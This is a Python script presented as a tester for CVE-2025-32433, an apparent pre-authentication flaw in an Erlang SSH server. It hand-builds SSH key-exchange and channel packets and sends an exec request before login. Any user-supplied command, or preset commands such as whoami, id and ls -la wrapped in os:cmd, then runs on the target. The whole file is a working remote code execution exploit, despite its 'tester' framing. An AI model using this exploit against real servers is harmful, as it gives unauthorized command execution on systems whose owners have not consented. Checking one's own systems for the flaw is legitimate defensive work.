#!/usr/bin/env python3
"""
CVE-2025-32433 SSH Vulnerability Tester
Credits: Vip3r-MC
"""

import socket
import struct
import time
import argparse

# ANSI color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

def string_payload(s):
    """Helper to format SSH string (4-byte length + bytes)"""
    s_bytes = s.encode("utf-8")
    return struct.pack(">I", len(s_bytes)) + s_bytes

def build_channel_open(channel_id=0):
    """Builds SSH_MSG_CHANNEL_OPEN for session"""
    return (
        b"\x5a"  # SSH_MSG_CHANNEL_OPEN
        + string_payload("session")
        + struct.pack(">I", channel_id)  # sender channel ID
        + struct.pack(">I", 0x68000)  # initial window size
        + struct.pack(">I", 0x10000)  # max packet size
    )

def build_channel_request(channel_id=0, command=None):
    """Builds SSH_MSG_CHANNEL_REQUEST with 'exec' payload"""
    if command is None:
        command = 'io:format("Vulnerability test successful~n").'
    return (
        b"\x62"  # SSH_MSG_CHANNEL_REQUEST
        + struct.pack(">I", channel_id)
        + string_payload("exec")
        + b"\x01"  # want_reply = true
        + string_payload(command)
    )

def build_kexinit():
    """Builds a minimal but valid SSH_MSG_KEXINIT packet"""
    cookie = b"\x00" * 16

    def name_list(l):
        return string_payload(",".join(l))

    return (
        b"\x14"
        + cookie
        + name_list([
            "curve25519-sha256",
            "ecdh-sha2-nistp256",
            "diffie-hellman-group-exchange-sha256",
            "diffie-hellman-group14-sha256",
        ])  # kex algorithms
        + name_list(["rsa-sha2-256", "rsa-sha2-512"])  # host key algorithms
        + name_list(["aes128-ctr"]) * 2  # encryption client->server, server->client
        + name_list(["hmac-sha1"]) * 2  # MAC algorithms
        + name_list(["none"]) * 2  # compression
        + name_list([]) * 2  # languages
        + b"\x00"
        + struct.pack(">I", 0)  # first_kex_packet_follows, reserved
    )

def pad_packet(payload, block_size=8):
    """Pads a packet to match SSH framing"""
    min_padding = 4
    padding_len = block_size - ((len(payload) + 5) % block_size)
    if padding_len < min_padding:
        padding_len += block_size
    return (
        struct.pack(">I", len(payload) + 1 + padding_len)
        + bytes([padding_len])
        + payload
        + bytes([0] * padding_len)
    )

def parse_ssh_response(response):
    """Parse SSH response and extract command output"""
    try:
        # Skip padding and packet length
        padding_length = response[4]
        payload_start = 5 + padding_length
        
        # Extract message type
        message_type = response[payload_start]
        
        if message_type == 0x5c:  # SSH_MSG_CHANNEL_DATA
            # Extract channel data
            channel_id = struct.unpack('>I', response[payload_start+1:payload_start+5])[0]
            data_length = struct.unpack('>I', response[payload_start+5:payload_start+9])[0]
            data = response[payload_start+9:payload_start+9+data_length]
            return data.decode('utf-8', errors='ignore')
        elif message_type == 0x63:  # SSH_MSG_CHANNEL_SUCCESS
            return "Command executed successfully"
        elif message_type == 0x64:  # SSH_MSG_CHANNEL_FAILURE
            return "Command execution failed"
        else:
            return f"Unknown message type: {hex(message_type)}"
    except Exception as e:
        return f"Error parsing response: {str(e)}"

def test_vulnerability(host='localhost', port=2222, command=None, timeout=5, verbose=False):
    """
    Test the CVE-2025-32433 vulnerability by attempting to exploit the SSH server.
    
    Args:
        host (str): Target host
        port (int): SSH port
        command (str): Command to execute
        timeout (int): Connection timeout in seconds
        verbose (bool): Enable verbose output
    
    Returns:
        bool: True if vulnerable, False if not
    """
    if verbose:
        print(f"{Colors.CYAN}[*] Testing CVE-2025-32433 on {host}:{port}{Colors.RESET}")
        if command:
            print(f"{Colors.CYAN}[*] Using command: {command}{Colors.RESET}")
    
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            if verbose:
                print(f"{Colors.YELLOW}[*] Connecting to SSH server...{Colors.RESET}")

            # 1. Banner exchange
            s.sendall(b"SSH-2.0-OpenSSH_8.9\r\n")
            banner = s.recv(1024)
            if verbose:
                print(f"{Colors.GREEN}[+] Received banner: {banner.strip().decode(errors='ignore')}{Colors.RESET}")
            time.sleep(0.5)

            # 2. Send SSH_MSG_KEXINIT
            if verbose:
                print(f"{Colors.YELLOW}[*] Sending SSH_MSG_KEXINIT...{Colors.RESET}")
            kex_packet = build_kexinit()
            s.sendall(pad_packet(kex_packet))
            time.sleep(0.5)

            # 3. Send SSH_MSG_CHANNEL_OPEN
            if verbose:
                print(f"{Colors.YELLOW}[*] Sending SSH_MSG_CHANNEL_OPEN...{Colors.RESET}")
            chan_open = build_channel_open()
            s.sendall(pad_packet(chan_open))
            time.sleep(0.5)

            # 4. Send SSH_MSG_CHANNEL_REQUEST (pre-auth!)
            if verbose:
                print(f"{Colors.YELLOW}[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...{Colors.RESET}")
            chan_req = build_channel_request(command=command)
            s.sendall(pad_packet(chan_req))

            # Try to receive any response
            try:
                response = s.recv(1024)
                if verbose:
                    print(f"{Colors.GREEN}[+] Raw response: {response.hex()}{Colors.RESET}")
                    print(f"{Colors.GREEN}[+] Parsed response: {parse_ssh_response(response)}{Colors.RESET}")
                print(f"{Colors.RED}[!] VULNERABLE: Server responded to pre-auth request{Colors.RESET}")
                return True
            except socket.timeout:
                if verbose:
                    print(f"{Colors.YELLOW}[*] No response within timeout period{Colors.RESET}")
                return False

    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
        return False

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-32433 SSH Vulnerability Tester')
    parser.add_argument('-H', '--host', default='localhost', help='Target host (default: localhost)')
    parser.add_argument('-p', '--port', type=int, default=2222, help='Target port (default: 2222)')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Connection timeout in seconds (default: 5)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    
    # Command group
    command_group = parser.add_mutually_exclusive_group()
    command_group.add_argument('-c', '--command', help='Custom command to execute')
    command_group.add_argument('-w', '--whoami', action='store_true', help='Execute whoami command')
    command_group.add_argument('-i', '--id', action='store_true', help='Execute id command')
    command_group.add_argument('-l', '--ls', action='store_true', help='Execute ls command')
    command_group.add_argument('-pwd', '--pwd', action='store_true', help='Execute pwd command')
    
    args = parser.parse_args()

    # Determine command to execute
    command = None
    if args.command:
        command = args.command
    elif args.whoami:
        command = 'os:cmd("whoami").'
    elif args.id:
        command = 'os:cmd("id").'
    elif args.ls:
        command = 'os:cmd("ls -la").'
    elif args.pwd:
        command = 'os:cmd("pwd").'

    print(f"{Colors.CYAN}[*] Starting CVE-2025-32433 vulnerability test{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Target: {args.host}:{args.port}{Colors.RESET}")
    if command:
        print(f"{Colors.CYAN}[*] Command: {command}{Colors.RESET}")
    
    result = test_vulnerability(
        host=args.host,
        port=args.port,
        command=command,
        timeout=args.timeout,
        verbose=args.verbose
    )
    
    if result:
        print(f"{Colors.RED}[!] VULNERABILITY CONFIRMED: System is vulnerable to CVE-2025-32433{Colors.RESET}")
        print(f"{Colors.RED}[!] The server responded to pre-authentication requests{Colors.RESET}")
    else:
        print(f"{Colors.GREEN}[+] VULNERABILITY NOT CONFIRMED: System appears to be secure{Colors.RESET}")
        print(f"{Colors.GREEN}[+] The server did not respond to pre-authentication requests{Colors.RESET}")

if __name__ == "__main__":
    main()